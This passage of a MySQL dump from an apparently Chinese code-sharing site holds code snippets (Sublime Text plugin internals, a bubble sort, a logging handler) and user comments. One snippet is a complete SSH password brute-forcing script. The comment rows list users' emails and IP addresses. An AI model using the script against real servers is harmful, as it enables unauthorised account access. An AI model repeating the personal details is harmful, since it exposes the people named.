zipfile.ZipFile(dst)\n		oldfiles = set(filter(isFileEntry, oldar.namelist()))\n	except (zipfile.error, IOError):\n		pass\n	oldar.close()\n\n	# delete any orphaned files\n	orphanedFiles = oldfiles\n	for f in orphanedFiles:\n		try:\n			os.remove(os.path.join(pkgdir, f))\n		except (os.error, IOError):\n			pass\n\n	# delete the archive and destination\n	try:\n		os.remove(dst)\n	except (os.error, IOError):\n		pass\n\n	try:\n		os.rmdir(pkgdir)\n	except (os.error, IOError):\n		pass\n\ndef srcNewer(src, dst):\n	try:\n		return (os.path.getmtime(src) > os.path.getmtime(dst)\n			or os.path.getsize(src) != os.path.getsize(dst))\n	except (os.error, IOError):\n		return True\n\ndef upgradePackage(pkg, pristinedir, datadir, backupdir):\n	pristinePkg = os.path.join(pristinedir, os.path.basename(pkg))\n	# if the zip is different from the one in pristinedir\n	if srcNewer(pkg, pristinePkg):\n		(base, ext) = os.path.splitext(os.path.basename(pkg))\n		inhibitOverwrite = (base == "User")\n		upgradeArchive(pkg, pristinePkg, os.path.join(datadir, base),\n			os.path.join(backupdir, base), inhibitOverwrite)\n\ndef upgrade(appdir, userdir, pristinedir, datadir, backupdir):\n	packages = (glob.glob(appdir + "/*.sublime-package") +\n			glob.glob(userdir + "/*.sublime-package"))\n\n	for pkg in packages:\n		upgradePackage(pkg, pristinedir, datadir, backupdir)\n\n	# Delete any packages that are no longer around\n	depzips = (set([os.path.basename(x) for x in glob.glob(pristinedir + "/*.sublime-package")])\n		- set([os.path.basename(x) for x in packages]))\n	for dz in depzips:\n		pz = os.path.join(pristinedir, dz)\n		(base, ext) = os.path.splitext(dz)\n		removeArchive(pz, os.path.join(datadir, base))\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'PackageSetup.py', 23, 8, '2012-07-14 00:52:36', 'sublime text 2'),
	('c55d78efa6404783bfce0a5d3f8b8d94', '0', 'console.log for IE8', 'Anonymous', 'Anonymous@talkincode.org', 'other', 'var alertFallback = true;\r\n   if (typeof console === "undefined" || typeof console.log === "undefined") {\r\n     console = {};\r\n     if (alertFallback) {\r\n         console.log = function(msg) {\r\n              alert(msg);\r\n         };\r\n     } else {\r\n         console.log = function() {};\r\n     }\r\n   }', NULL, 'javascript', NULL, 15, 6, '2012-07-17 23:19:02', NULL),
	('df6d5e09c8fa4e658c100f2382bb45da', 'None', 'sublime plugin module', 'pyer', 'jamiesun@talkincode.org', 'python,sublime text 2', '#@tags:sublime text \nimport os\nimport sys\nimport time\nimport sublime\nimport imp\n\napplication_command_classes = []\nwindow_command_classes = []\ntext_command_classes = []\n\nall_command_classes = [application_command_classes, window_command_classes, text_command_classes]\n\nall_callbacks = {\'on_new\': [], \'on_clone\': [], \'on_load\': [], \'on_close\': [],\n    \'on_pre_save\': [], \'on_post_save\': [], \'on_modified\': [],\n    \'on_selection_modified\': [],\'on_activated\': [], \'on_deactivated\': [],\n    \'on_project_load\': [], \'on_project_close\': [], \'on_query_context\': [],\n    \'on_query_completions\': []}\n\ndef unload_module(module):\n    if "unload_handler" in module.__dict__:\n        module.unload_handler()\n\n    # Unload the old plugins\n    if "plugins" in module.__dict__:\n        for p in module.plugins:\n            for cmd_cls_list in all_command_classes:\n                try:\n                    cmd_cls_list.remove(p)\n                except ValueError:\n                    pass\n            for c in all_callbacks.values():\n                try:\n                    c.remove(p)\n                except ValueError:\n                    pass\n\ndef unload_plugin(fname):\n    print "Unloading plugin", fname\n\n    modulename, ext = os.path.splitext(os.path.basename(fname))\n\n    was_loaded = modulename in sys.modules\n    if was_loaded:\n        m = __import__(modulename)\n        unload_module(m)\n\ndef reload_plugin(fname):\n    print "Reloading plugin", fname\n    path = os.path.dirname(fname)\n\n    # Change the current directory to that of the module. It\'s not safe to just\n    # add the modules directory to sys.path, as that won\'t accept unicode paths\n    # on Windows\n    oldpath = os.getcwdu()\n    os.chdir(path)\n\n    modulename, ext = os.path.splitext(os.path.basename(fname))\n\n    if modulename in sys.modules:\n        unload_module(sys.modules[modulename])\n    m_info = imp.find_module(modulename, ["."])\n    m = imp.load_module(modulename, *m_info)\n\n    # Restore the current directory\n    os.chdir(oldpath)\n\n    module_plugins = []\n    for type_name in dir(m):\n        try:\n            t = m.__dict__[type_name]\n            if t.__bases__:\n                is_plugin = False\n                if issubclass(t, ApplicationCommand):\n                    application_command_classes.append(t)\n                    is_plugin = True\n                if issubclass(t, WindowCommand):\n                    window_command_classes.append(t)\n                    is_plugin = True\n                if issubclass(t, TextCommand):\n                    text_command_classes.append(t)\n                    is_plugin = True\n\n                if is_plugin:\n                    module_plugins.append(t)\n\n                if issubclass(t, EventListener):\n                    obj = t()\n                    for p in all_callbacks.iteritems():\n                        if p[0] in dir(obj):\n                            p[1].append(obj)\n\n                    module_plugins.append(obj)\n\n        except AttributeError:\n            pass\n\n    if len(module_plugins) > 0:\n        m.plugins = module_plugins\n\ndef create_application_commands():\n    cmds = []\n    for class_ in application_command_classes:\n        cmds.append(class_())\n    return cmds\n\ndef create_window_commands(window):\n    cmds = []\n    for class_ in window_command_classes:\n        cmds.append(class_(window))\n    return cmds\n\ndef create_text_commands(view):\n    cmds = []\n    for class_ in text_command_classes:\n        cmds.append(class_(view))\n    return cmds\n\nEVENT_TIMEOUT = 0.2\nFAST_EVENT_TIMEOUT = 1 / 60.0\n\nfirst_time_msgs = set()\nmsgs = set()\n\ndef show_timeout(plugin_name, elapsed, callback):\n    global first_time_msgs\n    global msgs\n\n    key = plugin_name + callback\n    msg = ("A plugin (%s) may be making Sublime Text unresponsive by taking too " +\n        "long (%fs) in its %s callback.\\n\\nThis message can be disabled via the " +\n        "detect_slow_plugins setting") % (plugin_name, elapsed, callback)\n\n    # Give plugins one chance to respond slowly, to handle any initialisation issues etc.\n    # This allowance may be removed in the future due to startup time concerns\n    if not key in first_time_msgs:\n        first_time_msgs.add(key)\n        return\n\n    if not key in msgs:\n        msgs.add(key)\n        if sublime.load_settings(\'Preferences.sublime-settings\').get(\'detect_slow_plugins\', True):\n            sublime.error_message(msg)\n\nblocking_api_call_count = 0\ndef on_blocking_api_call():\n    global blocking_api_call_count\n    blocking_api_call_count += 1\n\ndef run_timed_function(f, name, event_name, timeout):\n    global blocking_api_call_count\n\n    t0 = time.time()\n    blocking_count = blocking_api_call_count\n    ret = f()\n    elapsed = time.time() - t0\n\n    if elapsed > timeout and blocking_api_call_count == blocking_count:\n        show_timeout(name, elapsed, event_name)\n\n    return ret\n\ndef on_new(v):\n    for callback in all_callbacks[\'on_new\']:\n        run_timed_function(lambda: callback.on_new(v),\n            callback.__module__, "on_new", EVENT_TIMEOUT)\n\ndef on_clone(v):\n    for callback in all_callbacks[\'on_clone\']:\n        run_timed_function(lambda: callback.on_clone(v),\n            callback.__module__, "on_clone", EVENT_TIMEOUT)\n\ndef on_load(v):\n    for callback in all_callbacks[\'on_load\']:\n        run_timed_function(lambda: callback.on_load(v),\n            callback.__module__, "on_load", EVENT_TIMEOUT)\n\ndef on_close(v):\n    for callback in all_callbacks[\'on_close\']:\n        run_timed_function(lambda: callback.on_close(v),\n            callback.__module__, "on_close", EVENT_TIMEOUT)\n\ndef on_pre_save(v):\n    for callback in all_callbacks[\'on_pre_save\']:\n        run_timed_function(lambda: callback.on_pre_save(v),\n            callback.__module__, "on_pre_save", EVENT_TIMEOUT)\n\ndef on_post_save(v):\n    for callback in all_callbacks[\'on_post_save\']:\n        run_timed_function(lambda: callback.on_post_save(v),\n            callback.__module__, "on_post_save", EVENT_TIMEOUT)\n\ndef on_modified(v):\n    for callback in all_callbacks[\'on_modified\']:\n        run_timed_function(lambda: callback.on_modified(v),\n            callback.__module__, "on_modified", FAST_EVENT_TIMEOUT)\n\ndef on_selection_modified(v):\n    for callback in all_callbacks[\'on_selection_modified\']:\n        run_timed_function(lambda: callback.on_selection_modified(v),\n            callback.__module__, "on_selection_modified", FAST_EVENT_TIMEOUT)\n\ndef on_activated(v):\n    for callback in all_callbacks[\'on_activated\']:\n        run_timed_function(lambda: callback.on_activated(v),\n            callback.__module__, "on_activated", EVENT_TIMEOUT)\n\ndef on_deactivated(v):\n    for callback in all_callbacks[\'on_deactivated\']:\n        run_timed_function(lambda: callback.on_deactivated(v),\n            callback.__module__, "on_deactivated", EVENT_TIMEOUT)\n\ndef on_project_load(v):\n    for callback in all_callbacks[\'on_project_load\']:\n        run_timed_function(lambda: callback.on_project_load(v),\n            callback.__module__, "on_project_load", EVENT_TIMEOUT)\n\ndef on_project_close(v):\n    for callback in all_callbacks[\'on_project_close\']:\n        run_timed_function(lambda: callback.on_project_close(v),\n            callback.__module__, "on_project_close", EVENT_TIMEOUT)\n\ndef on_query_context(v, key, operator, operand, match_all):\n    for callback in all_callbacks[\'on_query_context\']:\n        val = run_timed_function(lambda: callback.on_query_context(v, key, operator, operand, match_all),\n            callback.__module__, "on_query_context", FAST_EVENT_TIMEOUT)\n\n        if val:\n            return True\n\n    return False\n\ndef on_query_completions(v, prefix, locations):\n    completions = []\n    flags = 0\n    for callback in all_callbacks[\'on_query_completions\']:\n        res = callback.on_query_completions(v, prefix, locations)\n\n        if isinstance(res, tuple):\n            completions += res[0]\n            flags |= res[1]\n        elif isinstance(res, list):\n            completions += res\n\n    return (completions,flags)\n\nclass Command(object):\n    def name(self):\n        clsname = self.__class__.__name__\n        name = clsname[0].lower()\n        last_upper = False\n        for c in clsname[1:]:\n            if c.isupper() and not last_upper:\n                name += \'_\'\n                name += c.lower()\n            else:\n                name += c\n            last_upper = c.isupper()\n        if name.endswith("_command"):\n            name = name[0:-8]\n        return name\n\n    def is_enabled_(self, args):\n        try:\n            if args:\n                if \'event\' in args:\n                    del args[\'event\']\n\n                return self.is_enabled(**args)\n            else:\n                return self.is_enabled()\n        except TypeError:\n            return self.is_enabled()\n\n    def is_enabled(self):\n        return True\n\n    def is_visible_(self, args):\n        try:\n            if args:\n                return self.is_visible(**args)\n            else:\n                return self.is_visible()\n        except TypeError:\n            return self.is_visible()\n\n    def is_visible(self):\n        return True\n\n    def is_checked_(self, args):\n        try:\n            if args:\n                return self.is_checked(**args)\n            else:\n                return self.is_checked()\n        except TypeError:\n            return self.is_checked()\n\n    def is_checked(self):\n        return False\n\n    def description_(self, args):\n        try:\n            if args:\n                return self.description(**args)\n            else:\n                return self.description()\n        except TypeError as e:\n            return None\n\n    def description(self):\n        return None\n\n\nclass ApplicationCommand(Command):\n    def run_(self, args):\n        if args:\n            if \'event\' in args:\n                del args[\'event\']\n\n            return self.run(**args)\n        else:\n            return self.run()\n\n    def run(self):\n        pass\n\n\nclass WindowCommand(Command):\n    def __init__(self, window):\n        self.window = window\n\n    def run_(self, args):\n        if args:\n            if \'event\' in args:\n                del args[\'event\']\n\n            return self.run(**args)\n        else:\n            return self.run()\n\n    def run(self):\n        pass\n\n\nclass TextCommand(Command):\n    def __init__(self, view):\n        self.view = view\n\n    def run_(self, args):\n        if args:\n            if \'event\' in args:\n                del args[\'event\']\n\n            edit = self.view.begin_edit(self.name(), args)\n            try:\n                return self.run(edit, **args)\n            finally:\n                self.view.end_edit(edit)\n        else:\n            edit = self.view.begin_edit(self.name())\n            try:\n                return self.run(edit)\n            finally:\n                self.view.end_edit(edit)\n\n    def run(self, edit):\n        pass\n\n\nclass EventListener(object):\n    pass\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'sublime_plugin.py', 21, 8, '2012-07-14 00:48:51', 'sublime text 2'),
	('f0f179cc66584bce80b54c6510712cfb', '0', 'python冒泡算法', 'Anonymous', 'Anonymous@talkincode.org', '算法', '#!/usr/bin/python\r\n\r\nimport random\r\n\r\ndef bubble_sort(data):\r\n    length = len(data)\r\n\r\n    for i in range(len(data) - 1):\r\n	for j in range(len(data) - 1):\r\n	    if (data[j] < data[j + 1]):\r\n	    	    tmp = data[j]\r\n	    	    data[j] = data[j + 1]\r\n	    	    data[j + 1] = tmp\r\n\r\nr = random.Random()\r\n\r\ndata = []\r\nfor n in range(0, 20):\r\n    data.append(r.randint(1, 300))\r\n\r\nprint data, len(data)\r\n\r\n\r\nbubble_sort(data)\r\nprint data', NULL, 'python', NULL, 32, 6, '2012-07-17 23:38:49', NULL),
	('f54eda77ba69439ca7fbedc3c47acf49', '0', 'python SSH破解', 'Anonymous', 'Anonymous@talkincode.org', 'ssh', '#!/usr/bin/env python\r\n#-*-coding = UTF-8-*-\r\n#author@:dengyongkai\r\n#blog@:blog.sina.com.cn/kaiyongdeng\r\n\r\n\r\nimport sys\r\nimport os\r\nimport time\r\n#from threading import Thread\r\n\r\ntry:\r\n    from paramiko import SSHClient\r\n    from paramiko import AutoAddPolicy\r\nexcept ImportError:\r\n    print G+\'\'\'\r\n    You need paramiko module.\r\n    http://www.lag.net/paramiko/    \r\n    Debian/Ubuntu: sudo apt-get install aptitude\r\n		 : sudo aptitude install python-paramiko\\n\'\'\'+END\r\n    sys.exit(1)\r\n\r\ndocs =  """\r\n        	[*] This was written for educational purpose and pentest only. Use it at your own risk.\r\n        	[*] Author will be not responsible for any damage!                                                               \r\n        	[*] Toolname        : ssh_bf.py\r\n        	[*] Author          : xfk\r\n        	[*] Version         : v.0.2\r\n        	[*] Example of use  : python ssh_bf.py [-T target] [-P port] [-U userslist] [-W wordlist] [-H help]\r\n	"""\r\n\r\n\r\nif sys.platform == \'linux\' or sys.platform == \'linux2\':\r\n         clearing = \'clear\'\r\nelse:   \r\n         clearing = \'cls\'\r\nos.system(clearing)\r\n\r\n\r\nR = "\\033[31m";\r\nG = "\\033[32m";\r\nY = "\\033[33m"\r\nEND = "\\033[0m"\r\n\r\n\r\ndef logo():\r\n         print G+"\\n          		|---------------------------------------------------------------|"\r\n         print "         		|                                                               |"\r\n         print "         		|               blog.sina.com.cn/kaiyongdeng                    |"\r\n         print "         		|                16/05/2012 ssh_bf.py v.0.2                     |"\r\n         print "         		|                  SSH Brute Forcing Tool                       |"\r\n         print "         		|                                                               |"\r\n         print "         		|---------------------------------------------------------------|\\n"\r\n         print " \\n      	        	[-] %s\\n" % time.ctime()\r\n         print docs+END\r\n\r\n\r\ndef help():\r\n	print Y+"		[*]-H 		--hostname/ip 		<>the target hostname or ip address"\r\n	print "		[*]-P 		--port 			<>the ssh service port(default is 22)"\r\n	print "		[*]-U 		--usernamelist 		<>usernames list file"\r\n	print "		[*]-P 		--passwordlist 		<>passwords list file"\r\n	print "		[*]-H 		--help 			<>show help information"\r\n	print "		[*]Usage:python %s [-T target] [-P port] [-U userslist] [-W wordlist] [-H help]"+END\r\n	sys.exit(1)\r\n	\r\ndef BruteForce(hostname,port,username,password):\r\n        \'\'\'\r\n        Create SSH connection to target\r\n        \'\'\'\r\n        ssh = SSHClient()\r\n        ssh.set_missing_host_key_policy(AutoAddPolicy())\r\n        try:\r\n            ssh.connect(hostname, port, username, password, pkey=None, timeout = None, allow_agent=False, look_for_keys=False)\r\n            status = \'ok\'\r\n            ssh.close()\r\n        except Exception, e:\r\n            status = \'error\'\r\n            pass\r\n	return status\r\n\r\n\r\ndef makelist(file):\r\n    \'\'\'\r\n    Make usernames and passwords lists\r\n    \'\'\'\r\n    items = []\r\n\r\n    try:\r\n        fd = open(file, \'r\')\r\n    except IOError:\r\n        print R+\'unable to read file \\\'%s\\\'\' % file+END\r\n        pass\r\n\r\n    except Exception, e:\r\n        print R+\'unknown error\'+END\r\n        pass\r\n\r\n    for line in fd.readlines():\r\n        item = line.replace(\'\\n\', \'\').replace(\'\\r\', \'\')\r\n        items.append(item)\r\n    fd.close()	\r\n    return items\r\n\r\ndef main():\r\n        logo()  \r\n#	print "hello wold"\r\n        try:    \r\n                for arg in sys.argv:\r\n                        if arg.lower() == \'-t\' or arg.lower() == \'--target\':\r\n                                hostname = str(sys.argv[int(sys.argv[1:].index(arg))+2])\r\n       		 	if arg.lower() == \'-p\' or arg.lower() == \'--port\':\r\n       			 	port = sys.argv[int(sys.argv[1:].index(arg))+2]\r\n                        elif arg.lower() == \'-u\' or arg.lower() == \'--userlist\':\r\n                                userlist = sys.argv[int(sys.argv[1:].index(arg))+2]\r\n                        elif arg.lower() == \'-w\' or arg.lower() == \'--wordlist\':\r\n                                wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]\r\n                        elif arg.lower() == \'-h\' or arg.lower() == \'--help\':\r\n                                help()\r\n			elif len(sys.argv) <= 1:\r\n                                help()\r\n        except: \r\n                print R+"[-]Cheak your parametars input\\n"+END\r\n                help()\r\n        print G+"\\n[!] BruteForcing target ...\\n"+END\r\n#        print "here is ok"\r\n#        print hostname,port,wordlist,userlist\r\n        usernamelist = makelist(userlist)\r\n        passwordlist = makelist(wordlist)\r\n\r\n        print Y+"[*] SSH Brute Force Praparing."\r\n        print "[*] %s user(s) loaded." % str(len(usernamelist))\r\n        print "[*] %s password(s) loaded." % str(len(passwordlist))\r\n        print "[*] Brute Force Is Starting......."+END\r\n	try:\r\n        	for username in usernamelist:\r\n        		for password in passwordlist:\r\n				print G+"\\n[+]Attempt uaername:%s password:%s..." % (username,password)+END\r\n                		current = BruteForce(hostname, port, username, password)\r\n                        	if current == \'error\':\r\n					print R+"[-]O*O The username:%s and password:%s Is Disenbabled...\\n" % (username,password)+END\r\n#                        		pass\r\n                        	else:\r\n                                	print G+"\\n[+] ^-^ HaHa,We Got It!!!"\r\n                                	print "[+] username: %s" % username\r\n                                	print "[+] password: %s\\n" % password+END\r\n#                               	sys.exit(0)\r\n	except:\r\n		print R+"\\n[-] There Is Something Wrong,Pleace Cheak It."\r\n		print "[-] Exitting.....\\n"+END\r\n		raise\r\n        print Y+"[+] Done.^-^\\n"+END\r\n        sys.exit(0)\r\n\r\n\r\nif __name__ == "__main__":\r\n	main()', NULL, 'python', NULL, 41, 6, '2012-07-18 00:22:53', NULL);
/*!40000 ALTER TABLE `codes` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.comments
DROP TABLE IF EXISTS `comments`;
CREATE TABLE IF NOT EXISTS `comments` (
  `id` varchar(32) NOT NULL,
  `postid` varchar(32) NOT NULL,
  `content` text NOT NULL,
  `author` varchar(64) DEFAULT NULL,
  `userid` varchar(32) DEFAULT NULL,
  `email` varchar(128) DEFAULT NULL,
  `url` varchar(128) DEFAULT NULL,
  `ip` varchar(128) DEFAULT NULL,
  `agent` varchar(128) DEFAULT NULL,
  `status` int(1) NOT NULL,
  `created` varchar(32) NOT NULL,
  `via` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.comments: ~9 rows (approximately)
DELETE FROM `comments`;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
INSERT INTO `comments` (`id`, `postid`, `content`, `author`, `userid`, `email`, `url`, `ip`, `agent`, `status`, `created`, `via`) VALUES
	('3cdaeea2cfc245f5912a67ab3925db0a', 'f8a0d126a6704dd0b7933e4a2609f41d', 'shelve模块是anydbm的增强版，它支持在"dict-like"对象中存储任何可以被pickle序列化的对象，但key也必须是字符串。', 'jamiesun', 'd07d60af92a14169afc444f5d5aeb45a', 'jamiesun.net@gmail.com', NULL, '116.213.146.74', 'Python-urllib/2.6', 1, '2012-07-11 15:04:25', 'sublime text 2'),
	('40302aeab4da45d7a08af04ca82cfdc6', '90f1f8d21a284c0caebdacb248975cf9', '#!/usr/bin/python \r\n    #codeing:utf-8\r\n\r\n    import os\r\n    from optparse import OptionParser\r\n\r\n    def convutf8(chdir,cext):\r\n        if not chdir:chdir = \'.\'\r\n        if not cext:raise Exception(\'no file ext\')\r\n        for base,sub,files in os.walk(chdir):\r\n            for fd in files:\r\n                fpath = os.path.join(base,fd)\r\n                if fd.endswith(cext):\r\n                    try:\r\n                        with open(fpath,\'rb\') as wfd:\r\n                            print \'read  gbk file\',fd\r\n                            gbk_src = wfd.read().decode(\'gbk\')\r\n                            print \'write  utf8 file\',fd\r\n                            utf8_src = gbk_src.encode(\'utf-8\')\r\n                            wfd.write(utf8_src)\r\n                    except:\r\n                        print \'already utf-8\'\r\n\r\n    if __name__ == "__main__":\r\n        usage = "usage: %prog [options] arg"\r\n        parser = OptionParser(usage)\r\n        parser.add_option("-p", "--path", dest="path",help="files path")\r\n        parser.add_option("-e", "--ext",dest="ext", help="file ext")\r\n        (options, args) = parser.parse_args()\r\n        convutf8(options.path,options.ext)', 'hello', '', 'hello@talkincode.org', '', '118.250.22.230', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11', 0, '2012-07-23 18:03:48', NULL),
	('99d0a5fbbfa14d538313b901ed3f0be5', '86ff638f777f4afea8c82f571f13da9b', '    老婆，首先我想对你说：\r\n    老婆你是：\r\n    世界上最美丽的\r\n    世界上最温柔的\r\n    世界上最勤劳的\r\n    世界上最善良的\r\n    世界上最可爱的\r\n    世界上最懂我的\r\n    世界上最疼我的\r\n    世界上最精心照顾我的\r\n    总之，\r\n    你是我一生最爱的人\r\n\r\n    如果你笑，\r\n    老婆笑了：)\r\n    我更加高兴。\r\n\r\n    如果你哭，\r\n    呜呜，老婆伤心了。\r\n    我哄你笑。\r\n\r\n    老婆不在家。\r\n    我就很难入睡。\r\n\r\n    生活中难免有琐碎、摩擦。\r\n    老婆今天很生气，不爱理你。\r\n    都是我的错，是我不好。请老婆不要生气。\r\n    直到....\r\n    老婆破涕为笑。\r\n\r\n    希望能就这样平平静静的牵你手，一直走。\r\n    我爱你，我的老婆。\r\n    ——你的老公于：2012年7月12日下午', 'jamiesun', 'd07d60af92a14169afc444f5d5aeb45a', 'jamiesun.net@gmail.com', NULL, '116.213.146.74', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11', 1, '2012-07-12 18:19:04', NULL),
	('c9a0bab2b8d34b33baadff4e9175dd3d', 'f0f179cc66584bce80b54c6510712cfb', '弱爆了\r\n\r\n    tmp = data[j]\r\n    data[j] = data[j + 1]\r\n    data[j + 1] = tmp\r\n\r\n换成\r\n\r\n    data[j] ,data[j+1] = data[j+1],data[j]', 'kitty', NULL, '6583805@qq.com', '', '116.213.146.74', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11', 0, '2012-07-18 10:24:50', NULL),
	('cd24813e9dfa422fb771bca5bd9b0bfa', '2be005ac11964a1fb656d0ee4685dcd5', '如果代理需要用户名密码，用户名和密码要加密[编码处理](http://code.google.com/p/xbmc-iplayerv2/source/diff?spec=svn78&r=78&format=side&path=/trunk/plugin.video.iplayer/lib/httplib2/socks.py&old_path=/trunk/plugin.video.iplayer/lib/httplib2/socks.py&old=77)\r\n', 'kitty', NULL, '6583805@qq.com', '', '116.213.146.74', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11', 0, '2012-07-17 13:31:41', NULL),
	('daa631faa7924f27a1fdfaa3020e5b3c', '4f87f2ba100b41af80ebb816fb8d3489', '都差不多吧', 'pren', 'c93892ebe02e4ea1a5b06cab6d1e87ab', '6583805@qq.com', NULL, '116.213.146.74', 'Python-urllib/2.6', 1, '2012-07-11 20:02:14', 'sublime text 2'),
	('e4aad6f4dbad4125b0f228ec3e5a0988', 'f7eeffd66c0943cbb3ca5f4e00ac4007', '也不能这么自暴自弃吧，国内还是大有牛人的，只是比较低调。', 'jimi', '77151804ad17409383dd322156a77362', 'jimi@talkincode.org', NULL, '124.166.254.245', 'Python-urllib/2.6', 1, '', 'sublime text 2'),
	('eb65e4e53c9d4537bee428bc72668f0e', '61a2ca01db00491686dcd32b862e6d11', '### 带颜色的日志输出\r\n\r\n    # Copyright (C) 2010-2012 Vinay Sajip. All rights reserved. Licensed under the new BSD license.\r\n    #\r\n    import ctypes\r\n    import logging\r\n    import os\r\n\r\n    class ColorizingStreamHandler(logging.StreamHandler):\r\n        # color names to indices\r\n        color_map = {\r\n            \'black\': 0,\r\n            \'red\': 1,\r\n            \'green\': 2,\r\n            \'yellow\': 3,\r\n            \'blue\': 4,\r\n            \'magenta\': 5,\r\n            \'cyan\': 6,\r\n            \'white\': 7,\r\n        }\r\n\r\n        #levels to (background, foreground, bold/intense)\r\n        if os.name == \'nt\':\r\n            level_map = {\r\n                logging.DEBUG: (None, \'blue\', True),\r\n                logging.INFO: (None, \'white\', False),\r\n                logging.WARNING: (None, \'yellow\', True),\r\n                logging.ERROR: (None, \'red\', True),\r\n                logging.CRITICAL: (\'red\', \'white\', True),\r\n            }\r\n        else:\r\n            level_map = {\r\n                logging.DEBUG: (None, \'blue\', False),\r\n                logging.INFO: (None, \'black\', False),\r\n                logging.WARNING: (None, \'yellow\', False),\r\n                logging.ERROR: (None, \'red\', False),\r\n                logging.CRITICAL: (\'red\', \'white\', True),\r\n            }\r\n        csi = \'\\x1b[\'\r\n        reset = \'\\x1b[0m\'\r\n\r\n        @property\r\n        def is_tty(self):\r\n            isatty = getattr(self.stream, \'isatty\', None)\r\n            return isatty and isatty()\r\n\r\n        def emit(self, record):\r\n            try:\r\n                message = self.format(record)\r\n                stream = self.stream\r\n                if not self.is_tty:\r\n                    stream.write(message)\r\n                else:\r\n                    self.output_colorized(message)\r\n                stream.write(getattr(self, \'terminator\', \'\\n\'))\r\n                self.flush()\r\n            except (KeyboardInterrupt, SystemExit):\r\n                raise\r\n            except:\r\n                self.handleError(record)\r\n\r\n        if os.name != \'nt\':\r\n            def output_colorized(self, message):\r\n                self.stream.write(message)\r\n        else:\r\n            import re\r\n            ansi_esc = re.compile(r\'\\x1b\\[((?:\\d+)(?:;(?:\\d+))*)m\')\r\n\r\n            nt_color_map = {\r\n                0: 0x00,    # black\r\n                1: 0x04,    # red\r\n                2: 0x02,    # green\r\n                3: 0x06,    # yellow\r\n                4: 0x01,    # blue\r\n                5: 0x05,    # magenta\r\n                6: 0x03,    # cyan\r\n                7: 0x07,    # white\r\n            }\r\n\r\n            def output_colorized(self, message):\r\n                parts = self.ansi_esc.split(message)\r\n                write = self.stream.write\r\n                h = None\r\n                fd = getattr(self.stream, \'fileno\', None)\r\n                if fd is not None:\r\n                    fd = fd()\r\n                    if fd in (1, 2): # stdout or stderr\r\n                        h = ctypes.windll.kernel32.GetStdHandle(-10 - fd)\r\n                while parts:\r\n                    text = parts.pop(0)\r\n                    if text:\r\n                        write(text)\r\n                    if parts:\r\n                        params = parts.pop(0)\r\n                        if h is not None:\r\n                            params = [int(p) for p in params.split(\';\')]\r\n                            color = 0\r\n                            for p in params:\r\n                                if 40 <= p <= 47:\r\n                                    color |= self.nt_color_map[p - 40] << 4\r\n                                elif 30 <= p <= 37:\r\n                                    color |= self.nt_color_map[p - 30]\r\n                                elif p == 1:\r\n                                    color |= 0x08 # foreground intensity on\r\n                                elif p == 0: # reset to default color\r\n                                    color = 0x07\r\n                                else:\r\n                                    pass # error condition ignored\r\n                            ctypes.windll.kernel32.SetConsoleTextAttribute(h, color)\r\n\r\n        def colorize(self, message, record):\r\n            if record.levelno in self.level_map:\r\n                bg, fg, bold = self.level_map[record.levelno]\r\n                params = []\r\n                if bg in self.color_map:\r\n                    params.append(str(self.color_map[bg] + 40))\r\n                if fg in self.color_map:\r\n                    params.append(str(self.color_map[fg] + 30))\r\n                if bold:\r\n                    params.append(\'1\')\r\n                if params:\r\n                    message = \'\'.join((self.csi, \';\'.join(params),\r\n                                       \'m\', message, self.reset))\r\n            return message\r\n\r\n        def format(self, record):\r\n            message = logging.StreamHandler.format(self, record)\r\n            if self.is_tty:\r\n                # Don\'t colorize any traceback\r\n                parts = message.split(\'\\n\', 1)\r\n                parts[0] = self.colorize(parts[0], record)\r\n                message = \'\\n\'.join(parts)\r\n            return message\r\n\r\n    def main():\r\n        root = logging.getLogger()\r\n        root.setLevel(logging.DEBUG)\r\n        root.addHandler(ColorizingStreamHandler())\r\n        logging.debug(\'DEBUG\')\r\n        logging.info(\'INFO\')\r\n        logging.warning(\'WARNING\')\r\n        logging.error(\'ERROR\')\r\n        logging.critical(\'CRITICAL\')\r\n\r\n    if __name__ == \'__main__\':\r\n        main()', 'kitty', NULL, '6583805@qq.com', '', '116.213.146.74', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1171.0 Safari/537.1', 0, '2012-07-18 00:10:58', NULL),
	('ed45235914364c8e9b43543db7cd7f44', '4f87f2ba100b41af80ebb816fb8d3489', '我觉得bpython也不错的', 'kitty', NULL, 'kitty@123.com', '', '116.213.146.74', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11', 0, '2012-07-11 20:01:26', NULL);
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.groups
DROP TABLE IF EXISTS `groups`;
CREATE TABLE IF NOT EXISTS `groups` (
  `id` int(4) NOT NULL,
  `name` varchar(32) NOT NULL DEFAULT '',
  `description` text,
  `guid` varchar(32) NOT NULL,
  `posts` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `guid` (`guid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.groups: ~9 rows (approximately)
DELETE FROM `groups`;
/*!40000 ALTER TABLE `groups` DISABLE KEYS */;
INSERT INTO `groups` (`id`, `name`, `description`, `guid`, `posts`) VALUES
	(0, 'Talkincode专区', NULL, 'tic', 0),
	(1, '综合讨论', NULL, 'all', 0),
	(2, '函数式编程', NULL, 'func', 0),
	(3, 'python编程', NULL, 'python', 0),
